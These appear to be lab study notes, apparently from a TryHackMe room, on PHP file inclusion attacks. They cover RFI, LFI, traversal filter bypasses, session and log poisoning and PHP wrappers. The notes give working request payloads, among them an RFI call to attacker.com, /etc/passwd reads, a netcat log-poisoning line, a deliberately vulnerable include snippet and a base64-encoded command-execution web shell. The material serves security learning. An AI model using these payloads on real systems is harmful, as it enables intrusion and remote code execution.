## 📁 File Inclusion Fundamentals


File inclusion vulnerabilities occur when an application dynamically includes files without proper sanitization. 
* Traversal Strings (`../`): Used in path traversal to navigate up the directory hierarchy and access unintended files.
* Relative Pathing: Locating files relative to the executing script's current directory (e.g., `./folder/file.php`).
* Absolute Pathing: Locating files via the full path from the root directory (e.g., `/var/www/html/folder/file.php`).

### Remote File Inclusion (RFI)
RFI occurs when dynamic inclusion functions process user input to fetch files from remote servers. Attackers inject URLs pointing to externally hosted malicious scripts.

```http
# Typical RFI exploitation via GET parameter
GET /include.php?page=[http://attacker.com/exploit.php](http://attacker.com/exploit.php) HTTP/1.1
Host: target.thm
```
* Tool: Web Browser / Proxy Intercept

### Local File Inclusion (LFI)
LFI occurs when user input is manipulated to access files already present on the local server. While primarily a file disclosure vulnerability (e.g., reading `/etc/passwd`), it can escalate to Remote Code Execution (RCE) if the attacker can include files containing malicious code (e.g., logs, session files).

```http
# Typical LFI exploitation using path traversal to read sensitive files
GET /include.php?page=../../../../etc/passwd HTTP/1.1
Host: target.thm
```
* Tool: Web Browser / Proxy Intercept

## 🐘 PHP Wrappers
PHP wrappers provide access to data streams and can be abused for both data extraction and code execution during LFI exploitation.

### Data Extraction via Filters
The `php://filter` wrapper allows on-the-fly modification of data. Attackers frequently use encoding filters to bypass execution or syntax errors when extracting configuration files or source code.

```http
# Extracting /etc/passwd encoded in Base64 to prevent execution/parsing errors
GET /playground.php?page=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
```
* Tool: Web Browser / Proxy Intercept

Common filters include:
* String Filters: `string.rot13`, `string.toupper`, `string.tolower`, `string.strip_tags`
* Conversion Filters: `convert.base64-encode`, `convert.base64-decode`

### Inline Code Execution via Data Wrapper
The `data://` wrapper allows embedding data directly into the execution flow. 

```http
# Executing inline PHP code using the data wrapper
GET /playground.php?page=data:text/plain,<?php%20phpinfo();%20?> HTTP/1.1
```
* Tool: Web Browser / Proxy Intercept

## 🛡️ Bypassing Path Traversal Defenses

### Base Directory Breakout
Applications may enforce that a path begins with a specific directory but fail to adequately filter traversal strings.

```php
# Vulnerable PHP logic attempting to restrict inclusion to a specific directory while poorly filtering traversals
if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
    include $_GET['page'];
}
```
* Tool: Code Editor

Attackers bypass this by appending modified traversal sequences that fulfill the base directory requirement but circumvent the flawed filter.

```http
# Bypassing the filter by using extra slashes to navigate directories
GET /lfi.php?page=/var/www/html/..//..//..//etc/passwd HTTP/1.1
```
* Tool: Web Browser / Proxy Intercept

### Obfuscation Techniques
Filters specifically looking for `../` can be bypassed using encoding or sequence obfuscation.

* Standard URL Encoding: `../` becomes `%2e%2e%2f`
* Double URL Encoding (useful if the backend decodes twice): `../` becomes `%252e%252e%252f`
* Sequence Obfuscation (useful against simple string replacement filters): `....//` becomes `../` after the inner `../` is stripped.

## 🚀 Escalating LFI to RCE

### Session File Poisoning


If an attacker can control data stored in their PHP session, they can inject malicious code and then include the session file via LFI.

1. Inject payload into session data (e.g., `?page=<?php echo phpinfo(); ?>`).
2. Retrieve the `PHPSESSID` cookie value.
3. Include the session file located at `/var/lib/php/sessions/sess_[PHPSESSID]`.

```http
# Including the poisoned session file to execute the payload
GET /sessions.php?page=/var/lib/php/sessions/sess_a1b2c3d4e5f6 HTTP/1.1
```
* Tool: Web Browser / Proxy Intercept

### Log Poisoning
Attackers inject PHP code into server log files (e.g., via the User-Agent header or raw Netcat requests) and then include the log file via LFI.

```bash
# Injecting PHP code into the Apache access log via Netcat
nc 10.66.149.254 80
<?php echo phpinfo(); ?>
```
* Tool: Netcat

```http
# Including the poisoned Apache access log
GET /include.php?page=/var/log/apache2/access.log HTTP/1.1
```
* Tool: Web Browser / Proxy Intercept

### RCE via PHP Wrappers
The `php://filter` can decode Base64 payloads and immediately execute them if included.

```http
# Payload execution via base64 decoding wrapper
GET /playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami HTTP/1.1
```
* Tool: Web Browser / Proxy Intercept

The Base64 string `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` decodes to `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`.
